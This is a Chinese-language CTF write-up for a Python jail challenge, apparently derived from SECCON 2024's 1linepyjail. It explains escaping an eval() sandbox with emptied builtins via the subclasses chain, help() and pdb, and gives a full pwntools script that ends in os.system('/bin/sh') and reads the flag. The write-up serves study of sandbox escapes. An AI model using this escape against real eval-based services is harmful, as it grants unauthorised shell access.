# Easy Pyjail 1 Writeup

## 题目描述

本题是一个简单的 Python jail 挑战。程序禁用了 `__builtins__`，但允许用户输入任意代码并通过 `eval()` 执行。Flag 位于文件系统中的某个位置。

附件：

```python
# flag is located somewhere in the file system

while True:
    code = input("jail>")
    print(eval(code, {'__builtins__': {}}))
```

## 漏洞分析

Python jail 的核心漏洞在于即使禁用了 `__builtins__`，攻击者仍然可以通过对象继承链访问到其他内置模块和函数。本题是 SECCON 2024 Quals 1linepyjail 的简化版本。

## 攻击思路

1. **访问内置类**：通过 `().__class__.__base__.__subclasses__()` 获取所有内置类的列表
2. **利用 Helper 类**：实例化 `_sitebuiltins._Helper` 类来调用 `help()` 函数，从而加载 pdb 模块
3. **访问 sys 模块**：通过 `_sitebuiltins._Printer` 类访问 `sys` 模块
4. **调用 pdb.set_trace()**：通过 `sys.modules['pdb'].set_trace()` 进入调试模式
5. **执行任意代码**：在 pdb 调试模式下执行任意 Python 代码，获取 shell

## 解题步骤

### 1. 定位 Helper 和 Printer 类

首先需要找到 `_sitebuiltins._Helper` 和 `_sitebuiltins._Printer` 类在子类列表中的索引：

```python
from pwn import *

context(log_level="debug")

# step 1. locate Helper and Printer
p = process(["python3", "main.py"])
p.recvuntil(b"jail>")
p.sendline("().__class__.__base__.__subclasses__()".encode())
res = p.recvline().decode().removesuffix("]\n")

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)
```

### 2. 调用 help() 加载 pdb 模块

使用 Helper 类调用 `help()` 函数，加载 pdb 模块：

```python
# step 2. call help() to load pdb module
p = process(["python3", "main.py"])
p.recvuntil(b"jail>")
p.sendline((f"().__class__.__base__.__subclasses__()[{helper_index}]()()").encode())
# load pdb and return to jail
p.sendline(b"pdb")
p.sendline(b"main")
p.recvuntil(b"jail>")
```

### 3. 调用 pdb.set_trace()

通过 Printer 类访问 sys 模块，调用 `pdb.set_trace()` 进入调试模式：

```python
# step 3. locate sys module and call `sys.modules['pdb'].set_trace()`
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}]"
        + ".__init__.__globals__['sys'].modules['pdb'].set_trace()"
    ).encode()
)
```

### 4. 执行任意代码获取 shell

在 pdb 调试模式下执行任意 Python 代码：

```python
# step 4. get shell in pdb
p.recvuntil(b"(Pdb) ")
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}]"
        + ".__init__.__globals__['sys'].modules['os'].system('/bin/sh')"
    ).encode()
)
p.sendline(b"cat flag")
p.interactive()
```

## 完整攻击脚本

```python
from pwn import *

context(log_level="debug")

# step 1. locate Helper and Printer
p = process(["python3", "main.py"])
p.recvuntil(b"jail>")
p.sendline("().__class__.__base__.__subclasses__()".encode())
res = p.recvline().decode().removesuffix("]\n")

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)

# step 2. call help() to load pdb module
p = process(["python3", "main.py"])
p.recvuntil(b"jail>")
p.sendline((f"().__class__.__base__.__subclasses__()[{helper_index}]()()").encode())
# load pdb and return to jail
p.sendline(b"pdb")
p.sendline(b"main")
p.recvuntil(b"jail>")

# step 3. locate sys module and call `sys.modules['pdb'].set_trace()`
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}]"
        + ".__init__.__globals__['sys'].modules['pdb'].set_trace()"
    ).encode()
)

# step 4. get shell in pdb
p.recvuntil(b"(Pdb) ")
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}]"
        + ".__init__.__globals__['sys'].modules['os'].system('/bin/sh')"
    ).encode()
)
p.sendline(b"cat flag")
p.interactive()
```

## 总结

Python jail 题目是 CTF 中的常见题型，考察选手对 Python 对象模型和沙箱逃逸技术的理解。解决这类题目的关键在于：

1. **理解 Python 的对象继承链**：所有对象都继承自 `object` 类
2. **熟悉内置模块的访问方式**：即使 `__builtins__` 被禁用，仍然可以通过其他途径访问系统模块
3. **掌握常见的沙箱逃逸技巧**：如使用 `help()`、`pdb`等

更多 Python jail 的解题技巧可以参考 [Pyjail 总结](../../misc/pyjail.md)。
